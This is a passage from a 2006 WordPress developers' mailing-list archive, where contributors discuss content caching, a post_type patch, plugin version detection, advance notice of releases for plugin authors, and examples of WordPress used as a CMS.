>BDx8dIQ8+syp+RDO3zTsysE=
>=ljDU
>-----END PGP SIGNATURE-----
>_______________________________________________
>wp-hackers mailing list
>wp-hackers@lists.automattic.com
>http://lists.automattic.com/mailman/listinfo/wp-hackers
>  
>

From wphackers at jamietalbot.com  Wed Feb  8 11:00:38 2006
From: wphackers at jamietalbot.com (Jamie Talbot)
Date: Wed Feb  8 11:02:15 2006
Subject: [wp-hackers] 2.next - faster
In-Reply-To: <43E9CDBA.1060206@scytheman.net>
References: <8e1656660602061240m46e83979nbf5df64f085bf485@mail.gmail.com>	<43E8D163.1010308@scytheman.net>	<43E9CAD3.6070305@jamietalbot.com>
	<43E9CDBA.1060206@scytheman.net>
Message-ID: <43E9CF56.30605@jamietalbot.com>

-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1

Sebastian Herp wrote:
> Jamie Talbot wrote:
>> Some nice ideas there, +1 especially for removing now(), but we can't
>> really do 3. because that
>> would break the ability to create filters that work based on the
>> current time, or other
>> run-time-available-only information.
>>   
> 
> That's true. But those filters could still be executed on the
> "pre-rendered" content. But plugins like dofollow, textile, markdown,
> external link finders, etc do not need to filter the content every time
> it's displayed, do they?

That's true :) But we'd need a way to distinguish between those plugins that do and don't...

Jamie.

- --
http://jamietalbot.com
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.2.5 (MingW32)
Comment: Using GnuPG with Mozilla - http://enigmail.mozdev.org

iD8DBQFD6c9WrovxfShShFARAr4+AJ97usv+K9CT7giTu4S62M56rC0jgwCePdRU
QQoFfMJ8bJiA0UsJj+tTnuk=
=CLXp
-----END PGP SIGNATURE-----
From ryan at boren.nu  Wed Feb  8 11:08:55 2006
From: ryan at boren.nu (Ryan Boren)
Date: Wed Feb  8 11:10:27 2006
Subject: [wp-hackers] post_status and post_type
In-Reply-To: <34dea5010602080204k6c8ea739x@mail.gmail.com>
References: <1139378764.5565.12.camel@localhost.localdomain>
	<34dea5010602080204k6c8ea739x@mail.gmail.com>
Message-ID: <1139396935.5565.20.camel@localhost.localdomain>

On Wed, 2006-02-08 at 11:04 +0100, Choan C. G?lvez wrote:
> That's great! The impossibility of creating unpublished pages has been
> (for me) the great stopper to use WP as my clients' CMS.
> 
> Could it go into 2.0.2?

It's too intrusive for 2.0.2.  Probably 2.1.

> By the way, no attachment.

I think it was scrubbed.  Try this.

http://boren.nu/downloads/post_type.diff.txt

Ryan

From kimmo+key+wordpress.c4f53f at suominen.com  Wed Feb  8 11:23:45 2006
From: kimmo+key+wordpress.c4f53f at suominen.com (Kimmo Suominen)
Date: Wed Feb  8 11:25:21 2006
Subject: [wp-hackers] 2.next - faster
In-Reply-To: <43E9CF56.30605@jamietalbot.com>
References: <8e1656660602061240m46e83979nbf5df64f085bf485@mail.gmail.com>
	<43E8D163.1010308@scytheman.net> <43E9CAD3.6070305@jamietalbot.com>
	<43E9CDBA.1060206@scytheman.net> <43E9CF56.30605@jamietalbot.com>
Message-ID: <20060208112345.GZ1070@kimmo.suominen.com>

On Wed, Feb 08, 2006 at 08:00:38PM +0900, Jamie Talbot wrote:
> Sebastian Herp wrote:
> > That's true. But those filters could still be executed on the
> > "pre-rendered" content. But plugins like dofollow, textile, markdown,
> > external link finders, etc do not need to filter the content every time
> > it's displayed, do they?
> 
> That's true :) But we'd need a way to distinguish between those
> plugins that do and don't...

Different hook for each place, then --> fix plugin.  :)

I think it would be a good thing, and not so difficult to fix in the
plugins.

It would be good to have a standard way for the plugins to figure out
what version of WP they are in.  Maybe there is, and I just haven't
learned about it?

Best regards,
+ Kimmo
-- 
<A HREF="http://kimmo.suominen.com/">Kimmo Suominen</A>

From choan.galvez at gmail.com  Wed Feb  8 12:07:18 2006
From: choan.galvez at gmail.com (=?UTF-8?Q?Choan_C=2E_G=C3=A1lvez?=)
Date: Wed Feb  8 12:08:47 2006
Subject: [wp-hackers] post_status and post_type
In-Reply-To: <1139396935.5565.20.camel@localhost.localdomain>
References: <1139378764.5565.12.camel@localhost.localdomain>
	<34dea5010602080204k6c8ea739x@mail.gmail.com>
	<1139396935.5565.20.camel@localhost.localdomain>
Message-ID: <34dea5010602080407s9d47d64l@mail.gmail.com>

On 08/02/06, Ryan Boren <ryan@boren.nu> wrote:
> On Wed, 2006-02-08 at 11:04 +0100, Choan C. G?lvez wrote:
> > That's great! The impossibility of creating unpublished pages has been
> > (for me) the great stopper to use WP as my clients' CMS.
> >
> > Could it go into 2.0.2?
>
> It's too intrusive for 2.0.2.  Probably 2.1.
>
> > By the way, no attachment.
>
> I think it was scrubbed.  Try this.
>
> http://boren.nu/downloads/post_type.diff.txt

Thanks, I'll try it.

--
Choan
From denis at semiologic.com  Wed Feb  8 13:14:10 2006
From: denis at semiologic.com (Denis de Bernardy)
Date: Wed Feb  8 13:15:47 2006
Subject: [wp-hackers] Simplicity in 2.next
In-Reply-To: <43E94F40.6060509@boren.nu>
Message-ID: <000001c62cb1$8d43c460$6802a8c0@kergan>

> your plugins.  Most plugins are unmaintained, however.  Most plugin 
> authors do not follow the hackers list, and they wait until after a 
> release to update their plugins.  That's too late.

Mmm.... Plugin authors wait until after a release to update their plugins...
Now, let me see... A 3 day advance notice (before Christmas!) for WP 2. No
advance notice that I can think of for WordPress 2.0.1. Pardon, but I am
laughing out loud.

Giving a notice two weeks before WP updates occur will solve most of the
problems. Call it a 'public beta' stage, whatever you want. For plugins that
are actively maintained by their authors, this makes all the difference in
the world. For plugins who are abandonned, keeping them in a repository
makes this worse, since you end up maintaining a mess created by others.

Denis

From ryan at ryanduff.net  Wed Feb  8 13:27:50 2006
From: ryan at ryanduff.net (Ryan Duff)
Date: Wed Feb  8 13:28:46 2006
Subject: [wp-hackers] Simplicity in 2.next
In-Reply-To: <000001c62cb1$8d43c460$6802a8c0@kergan>
References: <000001c62cb1$8d43c460$6802a8c0@kergan>
Message-ID: <43E9F1D6.3030505@ryanduff.net>

Denis de Bernardy wrote:
>> your plugins.  Most plugins are unmaintained, however.  Most plugin 
>> authors do not follow the hackers list, and they wait until after a 
>> release to update their plugins.  That's too late.
> 
> Mmm.... Plugin authors wait until after a release to update their plugins...
> Now, let me see... A 3 day advance notice (before Christmas!) for WP 2. No
> advance notice that I can think of for WordPress 2.0.1. Pardon, but I am
> laughing out loud.
> 
> Giving a notice two weeks before WP updates occur will solve most of the
> problems. Call it a 'public beta' stage, whatever you want. For plugins that
> are actively maintained by their authors, this makes all the difference in
> the world. For plugins who are abandonned, keeping them in a repository
> makes this worse, since you end up maintaining a mess created by others.

+1

Advance notifications would be nice. Oh wait, I guess your logic is most 
plugin authors don't follow the hackers list, therefore, why make an 
announcement or have a public beta so they can fix things.

Again, like I said yesterday. If we clean out the repo of abandoned 
plugins and empty folders that were never populated by the author, that 
would solve most of the problem, the only ones in there would be ones 
actively maintained. No need for plugin gardeners

-- 
Ryan Duff
http://ryanduff.net
AIM: ryancduff
irc.freenode.net #wordpress
From jason at zenenet.com  Wed Feb  8 13:31:59 2006
From: jason at zenenet.com (Jason S.)
Date: Wed Feb  8 13:33:30 2006
Subject: [wp-hackers] Simplicity in 2.next
In-Reply-To: <43E95249.9050903@skippy.net>
References: <43E7AD17.6060907@mullenweg.com>	<43E7BF44.1090605@boren.nu>	<43E7C266.9000309@tamba2.org.uk>	<43E7C829.9040505@boren.nu>	<43E7CAF6.9010303@tamba2.org.uk>	<5aa3aa0602061426n3613221ay7754b236a9d7a863@mail.gmail.com>	<43E7DADA.4090700@ebroder.net>	<43E7E144.4090802@boren.nu>	<5aa3aa0602061722vfd65201w8e997f529c495702@mail.gmail.com>	<80f75db0602070711r1c8107c0k1fe38a5bb6bd7c7e@mail.gmail.com>	<5aa3aa0602070952o204c763ej5ed0270fac2377c6@mail.gmail.com>	<43E8E647.6000105@midnightcircus.com>	<43E930EF.3080605@mullenweg.com>	<43E94675.9020601@midnightcircus.com>	<43E948DA.9030906@boren.nu>	<43E94C0A.8020109@midnightcircus.com>
	<43E94F40.6060509@boren.nu> <43E95249.9050903@skippy.net>
Message-ID: <43E9F2CF.9050205@zenenet.com>

Scott Merrill wrote:
> Ryan Boren wrote:
>> For you, any advantage probably isn't worthwile.  You actually maintain
>> your plugins.  Most plugins are unmaintained, however.  Most plugin
>> authors do not follow the hackers list, and they wait until after a
>> release to update their plugins.  That's too late.  I'm trying to figure
>> a way to improve the end user experience.  Every time we try to address
>> this, we all get into this same argument and nothing is ever done.
> 
> I can see this developing somewhat akin to the Debian maintainer
> process.  The Debian maintainers apply patches and modify projects in
> ways to ensure compliance and compatibility with the Debian core.  They
> submit patches upstream, and upgrade their managed versions as needed.

+1, Gentoo
(Apologies if anyone else has already said this.)
From VOGELAP at UCMAIL.UC.EDU  Wed Feb  8 13:41:28 2006
From: VOGELAP at UCMAIL.UC.EDU (Vogel, Andrew (vogelap))
Date: Wed Feb  8 13:42:44 2006
Subject: [wp-hackers] WP as CMS examples
Message-ID: <E7340445E0595A418B2F8DE0AE480E20098A17B9@ucmail6.ad.uc.edu>

Oh yeah... I use WP on www.drewvogel.com, which is a CMS.

-andrew vogel
Manager of Professional Programs
University of Cincinnati
College of Pharmacy 
 

> -----Original Message-----
> From: wp-hackers-bounces@lists.automattic.com 
> [mailto:wp-hackers-bounces@lists.automattic.com] On Behalf Of 
> Thomas Silkj?r
> Sent: Wednesday, February 08, 2006 3:46 AM
> To: wp-hackers@lists.automattic.com
> Subject: Re: [wp-hackers] WP as CMS examples
> 
> I use it for www.theundersigned.net and www.theundersigned.net/book
> 
> /Thomas
> 
> 
> Den 08/02/2006 kl. 9.40 skrev Mani Monajjemi:
> 
> > well , here is an example in other language : 
> www.sayeban.org , it's 
> > in persian , but it uses WP as a CMS.
> >
> > On 2/8/06, Alex King <lists@alexking.org> wrote:
> >>
> >> Thanks guys. I wanted to point out that the FeedLounge web 
> site runs 
> >> nearly exclusively on WP (with PunBB for the forums and a custom 
> >> script for feature voting), and isn't nearly as "hacked" 
> as my King 
> >> Design site is. I think the only thing I've really customized 
> >> (besides the theme and a couple of plugins) is not allowing WP to 
> >> update the mod_rewrite rules and handling those by hand.
> >>
> >> It would be hard to convince me *not* to build a site on WP these 
> >> days. :)
> >>
> >> Cheers,
> >> --Alex King
> >>
> >> Personal             Business               FeedLounge
> >> http://alexking.org  http://kingdesign.net  http://feedlounge.com
> >>
> >>
> >>
> >>
> >> On Feb 8, 2006, at 12:49 AM, Matt Mullenweg wrote:
> >>
> >>> Roy Schestowitz wrote:
> >>>> Apart from heavily-hacked WordPress like < http:// 
> >>>> www.kingdesign.net/ >,
> >>>
> >>> Alex's site is great, thanks for pointing that out.
> >> _______________________________________________
> >> wp-hackers mailing list
> >> wp-hackers@lists.automattic.com
> >> http://lists.automattic.com/mailman/listinfo/wp-hackers
> >>
> >
> >
> >
> > --
> > Mani Monajjemi
> > www.manionline.org
> > _______________________________________________
> > wp-hackers mailing list
> > wp-hackers@lists.automattic.com
> > http://lists.automattic.com/mailman/listinfo/wp-hackers
> 
> _______________________________________________
> wp-hackers mailing list
> wp-hackers@lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
> 
From khanh at netspace.net.au  Wed Feb  8 13:42:09 2006
From: khanh at netspace.net.au (John Ha [c])
Date: Wed Feb  8 13:43:43 2006
Subject: [wp-hackers] Simplicity in 2.next [s]
References: <000001c62cb1$8d43c460$6802a8c0@kergan>
Message-ID: <078501c62cb5$75cfe760$6401a8c0@k9>

+1

Lately I hear about releases after the fact. It seems there is minimal notice on this list for release dates - unless I sift through all the posts with obscure subject headings, I might be able to find hints here and there. A tiny announcement of release date would be helpful for everyone.

John
  ----- Original Message ----- 
  From: Denis de Bernardy 
  To: wp-hackers@lists.automattic.com 
  Sent: Thursday, 9 February 2006 12:14 AM
  Subject: RE: [wp-hackers] Simplicity in 2.next


  > your plugins.  Most plugins are unmaintained, however.  Most plugin 
  > authors do not follow the hackers list, and they wait until after a 
  > release to update their plugins.  That's too late.

  Mmm.... Plugin authors wait until after a release to update their plugins...
  Now, let me see... A 3 day advance notice (before Christmas!) for WP 2. No
  advance notice that I can think of for WordPress 2.0.1. Pardon, but I am
  laughing out loud.

  Giving a notice two weeks before WP updates occur will solve most of the
  problems. Call it a 'public beta' stage, whatever you want. For plugins that
  are actively maintained by their authors, this makes all the difference in
  the world. For plugins who are abandonned, keeping them in a repository
  makes this worse, since you end up maintaining a mess created by others.

  Denis

  _______________________________________________
  wp-hackers mailing list
  wp-hackers@lists.automattic.com
  http://lists.automattic.com/mailman/listinfo/wp-hackers



-- 
------------------------ [ SECURITY NOTICE ]
------------------------
To: wp-hackers@lists.automattic.com.
For your security, khanh@netspace.net.au
digitally signed this message on 08 February 2006 at 13:42:10 UTC.
Verify this digital signature at http://www.ciphire.com/verify.
------------------- [ CIPHIRE DIGITAL SIGNATURE ]
-------------------
Q2lwaGlyZSBTaWcuAjh3cC1oYWNrZXJzQGxpc3RzLmF1dG9tYXR0aWMuY29tAGtoYW5oQ
G5ldHNwYWNlLm5ldC5hdQBlbWFpbCBib2R5AMQEAAB8AHwAAAABAAAAMvXpQ8QEAACYAw
ACAAIAAgAg8VGtcvYHOvWkCvgOMX2lA8lp65NgG+XmR5CoW8On08gBABh9ddIwqVYrJzb
+YRTkO3r9j+q978iHOOe1FIMyNojdg9qZy/DmApJmj5JKGOQbRYl8of4TciW0a734MCBs
h4lZU2lnRW5k
--------------------- [ END DIGITAL SIGNATURE ]
---------------------
From jp at jefte.net  Wed Feb  8 14:04:20 2006
From: jp at jefte.net (Jefte Puente)
Date: Wed Feb  8 14:05:57 2006
Subject: [wp-hackers] WP as CMS examples
In-Reply-To: <E7340445E0595A418B2F8DE0AE480E20098A17B9@ucmail6.ad.uc.edu>
References: <E7340445E0595A418B2F8DE0AE480E20098A17B9@ucmail6.ad.uc.edu>
Message-ID: <d20f32a50602080604n6a24b9fay17e6178c9ca7c8dc@mail.gmail.com>

http://blogsoftheday.com/ provides some non-WordPress functionality.

I have to echo some sentiments heard earlier. I too am a WordPress addict
and find myself not wanting to deploy a website unless its WP-powered.

Jefte Puente
http://jefte.net
From dmhouse at gmail.com  Wed Feb  8 14:05:56 2006
From: dmhouse at gmail.com (David House)
Date: Wed Feb  8 14:07:30 2006
Subject: [wp-hackers] 2.next - faster
In-Reply-To: <20060208112345.GZ1070@kimmo.suominen.com>
References: <8e1656660602061240m46e83979nbf5df64f085bf485@mail.gmail.com>
	<43E8D163.1010308@scytheman.net> <43E9CAD3.6070305@jamietalbot.com>
	<43E9CDBA.1060206@scytheman.net> <43E9CF56.30605@jamietalbot.com>
	<20060208112345.GZ1070@kimmo.suominen.com>
Message-ID: <ebe43d680602080605mce83c00k@mail.gmail.com>

On 08/02/06, Kimmo Suominen
> It would be good to have a standard way for the plugins to figure out
> what version of WP they are in.  Maybe there is, and I just haven't
> learned about it?

global $version;

See wp-includes/version.php

--
-David House, dmhouse@gmail.com, http://xmouse.ithium.net
From dmhouse at gmail.com  Wed Feb  8 14:08:28 2006
From: dmhouse at gmail.com (David House)
Date: Wed Feb  8 14:09:58 2006
Subject: [wp-hackers] post_status and post_type
In-Reply-To: <1139396935.5565.20.camel@localhost.localdomain>
References: <1139378764.5565.12.camel@localhost.localdomain>
	<34dea5010602080204k6c8ea739x@mail.gmail.com>
	<1139396935.5565.20.camel@localhost.localdomain>
Message-ID: <ebe43d680602080608g4fb58d74k@mail.gmail.com>

On 08/02/06, Ryan Boren <ryan@boren.nu> wrote:
> I think it was scrubbed.  Try this.

Mailman seems to scrub attachments with 'malicious' extensions, and I
guess .diff is among them (actually, more likely, it whitelists).

If you rename it to a .txt it works.

--
-David House, dmhouse@gmail.com, http://xmouse.ithium.net
From dmhouse at gmail.com  Wed Feb  8 14:10:21 2006
From: dmhouse at gmail.com (David House)
Date: Wed Feb  8 14:11:56 2006
Subject: [wp-hackers] Simplicity in 2.next
In-Reply-To: <43E9F1D6.3030505@ryanduff.net>
References: <000001c62cb1$8d43c460$6802a8c0@kergan>
	<43E9F1D6.3030505@ryanduff.net>
Message-ID: <ebe43d680602080610g58468270u@mail.gmail.com>

On 08/02/06, Ryan Duff <ryan@ryanduff.net> wrote:
> Advance notifications would be nice. Oh wait, I guess your logic is most
> plugin authors don't follow the hackers list, therefore, why make an
> announcement or have a public beta so they can fix things.

We could have a mailing list for plugin authors to subscribe to that
only posted preview release announcements. Or, we could put it on the
devblog with a big disclaimer: 'do not actually install, for plugin
authors only'.

--
-David House, dmhouse@gmail.com, http://xmouse.ithium.net
From davebytes at comcast.net  Wed Feb  8 14:22:01 2006
From: davebytes at comcast.net (David Chait)
Date: Wed Feb  8 14:23:31 2006
Subject: [wp-hackers] 2.next - faster
References: <8e1656660602061240m46e83979nbf5df64f085bf485@mail.gmail.com>	<43E8D163.1010308@scytheman.net><00b801c62c29$55a9f200$6e01a8c0@sixfour>
	<43E9C9C3.7090402@scytheman.net>
Message-ID: <007401c62cbb$0741d820$6e01a8c0@sixfour>

Well, WP-Cache fixed some bugs in Staticize certainly, and makes the cache 
accessible via a plugin interface and admin panel.  But the basic approach 
is the same.

As for caching to the DB, that's something that would almost need to be 
profiled on a system to suggest whether it would be faster or slower.  Is 
sql on the same box as apache?  In single box, is it memory-heavy so sql can 
cache things?  In either case, is sql bogged down with queries?  Is 
drive-access really fast (optimized for read-speed) for loading up cached 
page off disk vs across network?  Etc., etc.

Agreed, it could probably use further improvement, but even where it stands 
today it solves a lot of problems, and only creates a few. :)

-d

----- Original Message ----- 
From: "Sebastian Herp" <newsletter@scytheman.net>
To: <wp-hackers@lists.automattic.com>
Sent: Wednesday, February 08, 2006 5:36 AM
Subject: Re: [wp-hackers] 2.next - faster


| David Chait wrote:
| > Have you tried WP-Cache on your system?  Most of what you discuss would 
be
| > solved with WP-Cache built-in to WP in the future (on an option, of 
course).
| >
| >
| Yes, I tried WP-Cache. It does not speed up things versus Staticize
| Reloaded and even the later one modified to store the files in the
| database itself is fast enough (around 80 ms for every request). And
| yes, it is the ideal solution with some restrictions. Nothing some
| modifications shouldn't fix ;-) 

From radial at mindspring.com  Wed Feb  8 14:19:30 2006
From: radial at mindspring.com (Phil Hart)
Date: Wed Feb  8 14:24:09 2006
Subject: [wp-hackers] WP as CMS examples
In-Reply-To: <E7340445E0595A418B2F8DE0AE480E20098A17B9@ucmail6.ad.uc.edu>
Message-ID: <074901c62cba$b04774d0$0f01a8c0@vance.local>

My cheap implementation of WordPress as a CMS is at http://www.whootah.com
<http://www.whootah.com/> 

 

From denis at semiologic.com  Wed Feb  8 14:24:19 2006
From: denis at semiologic.com (Denis de Bernardy)
Date: Wed Feb  8 14:27:31 2006
Subject: [wp-hackers] Simplicity in 2.next
In-Reply-To: <ebe43d680602080610g58468270u@mail.gmail.com>
Message-ID: <000001c62cbb$5abdc310$6802a8c0@kergan>


> We could have a mailing list for plugin authors to subscribe 
> to that only posted preview release announcements. Or, we 

Why not announce this on the wordpress blog directly?

<snip>
# WordPress update

A new version of WordPress will be released in two weeks. If you are
anything of a hacker that is willing to help:

- [Download the public beta][download]
- Install it on a development server
- [File a bug][track] (and the fix, at your option) if it breaks
- Enable your favorite plugins one by one
- Contact the plugin authors when you if find one that breaks
</snip>


Just my $.02.

D.

From codehooligans at codehooligans.com  Wed Feb  8 14:32:47 2006
From: codehooligans at codehooligans.com (Paul Menard)
Date: Wed Feb  8 14:32:55 2006
Subject: [wp-hackers] WP as CMS examples
In-Reply-To: <43E97631.2040907@mullenweg.com>
References: <43E97631.2040907@mullenweg.com>
Message-ID: <5F94112F-52F8-45B7-A1D8-CF7401739341@codehooligans.com>

I work for Mindshare Interactive Campaigns. We build web sites mostly  
for non-profit and activist groups. We've been offering a hacked  
version of MT as a back-end CMS solution that will allow the client  
to maintain the content. Since Thanksgiving 2005 I've been working to  
get WP used as out default CMS offering. Note I use CMS very liberally.

Two site I've developed are:

http://www.equalityforall.com/
http://www.cgcareers.org

And even our company's site: http://www.mindshare.net is now using  
WP. Note the previous Mindshare website was written and maintained in  
a hybrid of MT and some other custom applications. Now the internal  
group that maintains the copy can edit nearly 99% of the information  
on the site.

True all of these have a News feed and/or Blog but they are not the  
primary vehicle used to drive the content.

The one big plus is we can develop a new site for a client in just a  
few hours time using WP and a new theme.

See you all at SXSW 2006 here in Austin.

Paul



On Feb 7, 2006, at 10:40 PM, Matt Mullenweg wrote:

> What are your favorite examples of WordPress being used for  
> something other than a blog, primarily? Feel free to toot your own  
> horn.
>
> -- 
> Matt Mullenweg
>  http://photomatt.net | http://wordpress.org
> http://automattic.com | http://akismet.com
> _______________________________________________
> wp-hackers mailing list
> wp-hackers@lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From dstewart at atl.lmco.com  Wed Feb  8 14:40:49 2006
From: dstewart at atl.lmco.com (Doug Stewart)
Date: Wed Feb  8 14:42:25 2006
Subject: [wp-hackers] Simplicity in 2.next
In-Reply-To: <43E941D5.4070505@midnightcircus.com>
References: <773fe1ad06616a23b4a392dac3e81b6a@imap.scorpionshops.com>
	<43E8B756.10609@atl.lmco.com> <43E8B7C7.3050101@atl.lmco.com>
	<43E941D5.4070505@midnightcircus.com>
Message-ID: <43EA02F1.6060404@atl.lmco.com>

Owen Winkler wrote:
> 
> No, your original assessment seems fair.  ;)
> 
> Owen
> 

To quote "Austin Powers: International Man of Mystery": Ouch, very ouch, 
baby.
-- 
----------
Doug Stewart
Systems Administrator/Web Applications Developer
Lockheed Martin Advanced Technology Labs
dstewart@atl.lmco.com
From khanh at netspace.net.au  Wed Feb  8 14:40:49 2006
From: khanh at netspace.net.au (John Ha [c])
Date: Wed Feb  8 14:42:28 2006
Subject: [wp-hackers] Simplicity in 2.next [s]
References: <000001c62cbb$5abdc310$6802a8c0@kergan>
Message-ID: <07ae01c62cbd$a820f0d0$6401a8c0@k9>

Maybe a post to wp-hackers with a suitable subject heading eg:

"Release date: Wordpress x.x.x - dd/mm/yy"
"Version x.x.x: dd/mm/yy"
"Version x.x.x in 2 weeks - be ready!"

That's $.04.

John
  ----- Original Message ----- 
  From: Denis de Bernardy 
  To: wp-hackers@lists.automattic.com 
  Sent: Thursday, 9 February 2006 1:24 AM
  Subject: RE: [wp-hackers] Simplicity in 2.next



  > We could have a mailing list for plugin authors to subscribe 
  > to that only posted preview release announcements. Or, we 

  Why not announce this on the wordpress blog directly?

  <snip>
  # WordPress update

  A new version of WordPress will be released in two weeks. If you are
  anything of a hacker that is willing to help:

  - [Download the public beta][download]
  - Install it on a development server
  - [File a bug][track] (and the fix, at your option) if it breaks
  - Enable your favorite plugins one by one
  - Contact the plugin authors when you if find one that breaks
  </snip>


  Just my $.02.

  D.

  _______________________________________________
  wp-hackers mailing list
  wp-hackers@lists.automattic.com
  http://lists.automattic.com/mailman/listinfo/wp-hackers



-- 
------------------------ [ SECURITY NOTICE ]
------------------------
To: wp-hackers@lists.automattic.com.
For your security, khanh@netspace.net.au
digitally signed this message on 08 February 2006 at 14:40:50 UTC.
Verify this digital signature at http://www.ciphire.com/verify.
------------------- [ CIPHIRE DIGITAL SIGNATURE ]
-------------------
Q2lwaGlyZSBTaWcuAjh3cC1oYWNrZXJzQGxpc3RzLmF1dG9tYXR0aWMuY29tAGtoYW5oQ
G5ldHNwYWNlLm5ldC5hdQBlbWFpbCBib2R5ALEDAAB8AHwAAAABAAAA8gLqQ7EDAABSAw
ACAAIAAgAg8VGtcvYHOvWkCvgOMX2lA8lp65NgG+XmR5CoW8On08gBABh9ddIwqVYrJzb
+YRTkO3r9j+q978iHOOe1FIMyNojdn96uffLRBTAeDzHStnUgwTKDWe0l0R7NVg27eM2b
A8NwU2lnRW5k
--------------------- [ END DIGITAL SIGNATURE ]
---------------------
From dstewart at atl.lmco.com  Wed Feb  8 14:51:26 2006
From: dstewart at atl.lmco.com (Doug Stewart)
Date: Wed Feb  8 14:56:25 2006
Subject: [wp-hackers] Simplicity in 2.next
In-Reply-To: <1139384828.5565.19.camel@localhost.localdomain>
References: <43E7AD17.6060907@mullenweg.com> <43E7BF44.1090605@boren.nu>
	<43E7C266.9000309@tamba2.org.uk> <43E7C829.9040505@boren.nu>
	<43E7CAF6.9010303@tamba2.org.uk>
	<5aa3aa0602061426n3613221ay7754b236a9d7a863@mail.gmail.com>
	<43E7DADA.4090700@ebroder.net> <43E7E144.4090802@boren.nu>
	<5aa3aa0602061722vfd65201w8e997f529c495702@mail.gmail.com>
	<80f75db0602070711r1c8107c0k1fe38a5bb6bd7c7e@mail.gmail.com>
	<5aa3aa0602070952o204c763ej5ed0270fac2377c6@mail.gmail.com>
	<43E8E647.6000105@midnightcircus.com>
	<43E930EF.3080605@mullenweg.com>
	<43E94675.9020601@midnightcircus.com> <43E948DA.9030906@boren.nu>
	<43E94C0A.8020109@midnightcircus.com>
	<43E94F40.6060509@boren.nu> <43E95249.9050903@skippy.net>
	<43E95820.7050803@boren.nu> <43E9A0EA.6080606@mullenweg.com>
	<1139384828.5565.19.camel@localhost.localdomain>
Message-ID: <43EA056E.4040002@atl.lmco.com>

Ryan Boren wrote:
> 
> Right.  The best situation is where we could get a patch upstreamed to
> the original author.  But if they're unresponsive, we need to be able to
> commit a fix that will allow people to upgrade.  Think linux distro
> model.
> 
> Ryan

That seems like a particularly unhelpful analogy to be following here. 
Linux distros ship a lot of software with each release and are 
responsible for insuring that all that software works together. 
WordPress' model is exactly the opposite: you get core functionality and 
Hello Dolly, nothing else.  Unless you're proposing shipping a massive 
.zip/.tar.gz with every bloody plugin known to the WP community, I fail 
to see the comparison as a valid one.

Most plugins are the work of a single author, with little code control 
or existing bug tracking interface.  The best way to keep plugins 
working and up to date is to bug the authors, a task which is best left 
to a decentralized infrastructure (i.e., let the people who use the 
plugins annoy the plugin authors).

I think something along the lines of the old One-Click installs from 
wp-plugins.net or the direction that Alchemy/Elixir were heading is a 
much better idea, IMNSHO.

-- 
----------
Doug Stewart
Systems Administrator/Web Applications Developer
Lockheed Martin Advanced Technology Labs
dstewart@atl.lmco.com
From khanh at netspace.net.au  Wed Feb  8 14:58:49 2006
From: khanh at netspace.net.au (John Ha [c])
Date: Wed Feb  8 15:00:23 2006
Subject: [wp-hackers] Simplicity in 2.next [s]
References: <43E7AD17.6060907@mullenweg.com>
	<43E7BF44.1090605@boren.nu><43E7C266.9000309@tamba2.org.uk>
	<43E7C829.9040505@boren.nu><43E7CAF6.9010303@tamba2.org.uk><5aa3aa0602061426n3613221ay7754b236a9d7a863@mail.gmail.com><43E7DADA.4090700@ebroder.net>
	<43E7E144.4090802@boren.nu><5aa3aa0602061722vfd65201w8e997f529c495702@mail.gmail.com><80f75db0602070711r1c8107c0k1fe38a5bb6bd7c7e@mail.gmail.com><5aa3aa0602070952o204c763ej5ed0270fac2377c6@mail.gmail.com><43E8E647.6000105@midnightcircus.com><43E930EF.3080605@mullenweg.com><43E94675.9020601@midnightcircus.com>
	<43E948DA.9030906@boren.nu><43E94C0A.8020109@midnightcircus.com><43E94F40.6060509@boren.nu>
	<43E95249.9050903@skippy.net><43E95820.7050803@boren.nu>
	<43E9A0EA.6080606@mullenweg.com><1139384828.5565.19.camel@localhost.localdomain>
	<43EA056E.4040002@atl.lmco.com>
Message-ID: <07c401c62cc0$2b8865a0$6401a8c0@k9>

+1
  ----- Original Message ----- 
  From: Doug Stewart 
  To: wp-hackers@lists.automattic.com 
  Sent: Thursday, 9 February 2006 1:51 AM
  Subject: Re: [wp-hackers] Simplicity in 2.next


  Ryan Boren wrote:
  > 
  > Right.  The best situation is where we could get a patch upstreamed to
  > the original author.  But if they're unresponsive, we need to be able to
  > commit a fix that will allow people to upgrade.  Think linux distro
  > model.
  > 
  > Ryan

  That seems like a particularly unhelpful analogy to be following here. 
  Linux distros ship a lot of software with each release and are 
  responsible for insuring that all that software works together. 
  WordPress' model is exactly the opposite: you get core functionality and 
  Hello Dolly, nothing else.  Unless you're proposing shipping a massive 
  .zip/.tar.gz with every bloody plugin known to the WP community, I fail 
  to see the comparison as a valid one.

  Most plugins are the work of a single author, with little code control 
  or existing bug tracking interface.  The best way to keep plugins 
  working and up to date is to bug the authors, a task which is best left 
  to a decentralized infrastructure (i.e., let the people who use the 
  plugins annoy the plugin authors).

  I think something along the lines of the old One-Click installs from 
  wp-plugins.net or the direction that Alchemy/Elixir were heading is a 
  much better idea, IMNSHO.

  -- 
  ----------
  Doug Stewart
  Systems Administrator/Web Applications Developer
  Lockheed Martin Advanced Technology Labs
  dstewart@atl.lmco.com
  _______________________________________________
  wp-hackers mailing list
  wp-hackers@lists.automattic.com
  http://lists.automattic.com/mailman/listinfo/wp-hackers



-- 
------------------------ [ SECURITY NOTICE ]
------------------------
To: wp-hackers@lists.automattic.com.
For your security, khanh@netspace.net.au
digitally signed this message on 08 February 2006 at 14:58:50 UTC.
Verify this digital signature at http://www.ciphire.com/verify.
------------------- [ CIPHIRE DIGITAL SIGNATURE ]
-------------------
Q2lwaGlyZSBTaWcuAjh3cC1oYWNrZXJzQGxpc3RzLmF1dG9tYXR0aWMuY29tAGtoYW5oQ
G5ldHNwYWNlLm5ldC5hdQBlbWFpbCBib2R5AH0FAAB8AHwAAAABAAAAKgfqQ30FAABdAg
ACAAIAAgAg8VGtcvYHOvWkCvgOMX2lA8lp65NgG+XmR5CoW8On08gBABh9ddIwqVYrJzb
+YRTkO3r9j+q978iHOOe1FIMyNojdO11MBtPZLIEeZ2VY1cOzd0+iN6yRmXc4wEmeahhw
5uOtU2lnRW5k
--------------------- [ END DIGITAL SIGNATURE ]
---------------------
From dmhouse at gmail.com  Wed Feb  8 15:06:46 2006
From: dmhouse at gmail.com (David House)
Date: Wed Feb  8 15:08:16 2006
Subject: [wp-hackers] Simplicity in 2.next
